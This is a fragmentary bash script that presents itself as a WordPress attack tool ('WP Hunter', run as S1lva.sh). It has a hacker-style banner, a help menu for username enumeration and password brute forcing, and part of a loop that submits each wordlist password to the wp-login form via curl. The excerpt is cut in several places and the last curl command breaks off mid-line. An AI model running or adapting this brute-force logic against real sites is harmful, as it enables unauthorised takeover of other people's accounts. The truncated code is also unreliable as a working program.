...
echo -e "\e[1;31m
 ...
 \ \        / /  __ \    | |  | |           | |
  \ \  /\  / /| |__) |   | |__| |_   _ _ __ | |_ ___ _ __          ##########################
   \ \/  \/ / |  ___/    |  __  | | | | '_ \| __/ _ \ '__|        # Account : @6ec_0       #
    \  /\  /  | |        | |  | | |_| | | | | ||  __/ |          # created by Cyber seC   #
     \/  \/   |_|    xx  |_|  |_|\__,_|_| |_|\__\___|_|         ##########################

                            \e[1;34m  @Copyrit of Salvatore
"

# Help
helpMenu(){
    echo -e "\e[1;33mArguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
    echo -e "User Enumeration:\n./S1lva.sh --url=testphp.vulnweb.com\n\nPassword Bruteforce:\n./s1lva.sh --url=testphp.vulnweb.com --user=admin --wordlist=wordlist.txt\e[1;32m"
}
...
do {
        echo $line
        REQ=`curl -s -b "$COOKIEPATH" -A "$USERAGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d te>
